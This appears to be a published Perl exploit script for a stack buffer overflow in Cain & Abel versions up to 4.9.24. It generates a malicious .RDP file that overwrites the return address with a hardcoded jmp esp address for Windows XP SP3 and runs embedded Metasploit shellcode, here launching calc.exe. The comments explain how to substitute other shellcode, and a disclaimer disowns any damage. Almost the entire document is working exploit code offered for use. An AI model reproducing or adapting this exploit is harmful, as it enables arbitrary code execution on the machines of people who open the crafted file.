#!/usr/bin/perl
#
# Cain & Abel <= v4.9.24 .RDP Stack Overflow Exploit
# Exploit by SkD (skdrat@hotmail.com)
# -----------------------------------------------
#
# Nothing much to say about this one. This works on
# an updated Windows XP SP3. On Vista this exploit is way easier
# the more challenging one was on XP, and here it is.
# Enjoy :). Also remember if you want to put your own shellcode
# there are a few character restrictions and using Alpha2 or
# Alpha Numerical won't work at all.
# To open the .RDP file in Cain & Abel, click the
# "Remote Password Decoder Dialog" icon.
# Credits to Encrypt3d.M!nd.
# {Author has no responsibility over the damage you do with this!}

use strict; use warnings;

# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com
my $shellcode =
"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x19".
"\xc5\xd8\x59\x83\xeb\xfc\xe2\xf4\xe5\x2d\x9c\x59\x19\xc5\x53\x1c".
"\x25\x4e\xa4\x5c\x61\xc4\x37\xd2\x56\xdd\x53\x06\x39\xc4\x33\x10".
"\x92\xf1\x53\x58\xf7\xf4\x18\xc0\xb5\x41\x18\x2d\x1e\x04\x12\x54".
"\x18\x07\x33\xad\x22\x91\xfc\x5d\x6c\x20\x53\x06\x3d\xc4\x33\x3f".
"\x92\xc9\x93\xd2\x46\xd9\xd9\xb2\x92\xd9\x53\x58\xf2\x4c\x84\x7d".
"\x1d\x06\xe9\x99\x7d\x4e\x98\x69\x9c\x05\xa0\x55\x92\x85\xd4\xd2".
"\x69\xd9\x75\xd2\x71\xcd\x33\x50\x92\x45\x68\x59\x19\xc5\x53\x31".
"\x25\x9a\xe9\xaf\x79\x93\x51\xa1\x9a\x05\xa3\x09\x71\x35\x52\x5d".
"\x46\xad\x40\xa7\x93\xcb\x8f\xa6\xfe\xa6\xb9\x35\x7a\xeb\xbd\x21".
"\x7c\xc5\xd8\x59";
my $addr = "\xb5\xb5\xfd\x7f";
my $overflow = "\x41" x 8206 ;
my $overflow2 = "\x41" x 255 ;
my $eip = "\xd7\x30\x9d\x7c"; #   FOR WINDOWS XP SP3:  0x7c9d30d7       jmp esp (shell32.dll)

open(my $rdp, "> s.rdp");
print $rdp $overflow.$eip.$addr.$overflow2.$shellcode;
close($rdp);